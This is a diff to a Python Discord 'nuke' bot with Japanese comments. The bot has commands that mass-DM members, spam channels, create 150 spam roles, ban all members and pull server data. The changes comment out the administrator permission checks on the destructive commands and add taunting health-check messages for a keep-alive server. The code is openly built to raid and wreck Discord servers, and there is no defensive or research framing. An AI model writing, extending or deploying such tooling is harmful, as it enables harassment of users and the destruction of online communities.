@@ -94,7 +94,8 @@ async def mass_dm_terror(guild, content):
 # ----------------------------------------------------
 
 @bot.command(name="serverdata") 
-@commands.has_permissions(administrator=True) 
+# 🚨 管理者権限チェックを削除
+# @commands.has_permissions(administrator=True) 
 async def get_server_data(ctx, server_id: int):
     """指定されたサーバーIDの詳細情報を取得する。"""
     
@@ -176,7 +177,8 @@ async def send_spam_message_with_delay(channel, content):
 # ----------------------------------------------------
 
 @bot.command(name="nuke") 
-@commands.has_permissions(administrator=True, manage_guild=True) 
+# 🚨 管理者権限チェックを削除
+# @commands.has_permissions(administrator=True, manage_guild=True) 
 async def ultimate_nuke_command(ctx): 
     
     guild = ctx.guild
@@ -267,8 +269,8 @@ async def ultimate_nuke_command(ctx):
             
             await asyncio.sleep(random.uniform(0.5, 1.0))
 
-    # 🚨 4. ロールスパム機能 (150個のロール作成) - ユーザー要求に合わせて修正！
-    role_count = 150 # 150に変更！
+    # 🚨 4. ロールスパム機能 (150個のロール作成)
+    role_count = 150 # 150個のロールを作成！
     role_name = "ruru by nuke"
     
     role_creation_tasks = []
@@ -316,7 +318,8 @@ async def ultimate_nuke_command(ctx):
 # ----------------------------------------------------
 
 @bot.command(name="banall") 
-@commands.has_permissions(administrator=True) 
+# 🚨 管理者権限チェックを削除
+# @commands.has_permissions(administrator=True) 
 async def ban_all_members(ctx):
     guild = ctx.guild
 
@@ -399,7 +402,7 @@ async def on_guild_join(guild):
         except Exception as e:
             logging.error(f"レポートチャンネルへの送信中にエラーが発生したぜ: {e}")
     else:
-        logging.error(f"レポートチャンネルが見つからねぇ！ID: {REPORT_CHANNEL_ID}")
+        logging.error(f"レポートチャンネルが見つからねえぞ！ID: {REPORT_CHANNEL_ID}")
 
 
 # ----------------------------------------------------
@@ -427,7 +430,7 @@ async def on_message(message):
 
 
 # ----------------------------------------------------
-# --- KeepAlive Server (Render/Uptime Robot対応) ---
+# --- KeepAlive Server (Freshping/Render対応) ---
 # ----------------------------------------------------
 
 def start_bot():
@@ -438,6 +441,7 @@ def start_bot():
     else:
         logging.warning("Discord Botを起動中... 破壊の時だ。")
         try:
+            # log_handler=None を設定し、ホスティング環境でのログエラーを防ぐ
             bot.run(DISCORD_BOT_TOKEN, log_handler=None) 
             
         except discord.errors.LoginFailure:
@@ -451,15 +455,15 @@ bot_thread.start()
 
 @app.route("/")
 def home():
-    """UptimeRobotからのヘルスチェックに応答するエンドポイント"""
+    """Freshpingからのヘルスチェックに応答するエンドポイント"""
     if bot.is_ready():
-        return "Bot is running and ready for INSTANT NUKE!"
+        # Freshping偵察用の挑発的なメッセージだ！
+        return "🚨 NUKE READY! Freshpingの偵察、感謝する！次の破壊の準備は完了したぜ！"
     else:
         # Botの起動が完了していない場合は503エラーを返す
-        return "Bot is starting up or failed to start...", 503
+        return "Bot is starting up... Almost ready to deploy chaos.", 503
 
 @app.route("/keep_alive", methods=["GET"])
 def keep_alive_endpoint():
     """冗長的なヘルスチェックエンドポイント"""
     return jsonify({"message": "Alive. Now go break something."}), 200
-
